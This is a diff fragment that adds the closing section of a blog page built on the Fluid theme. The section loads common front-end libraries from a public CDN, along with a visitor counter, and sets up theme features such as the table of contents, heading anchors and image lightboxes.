+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
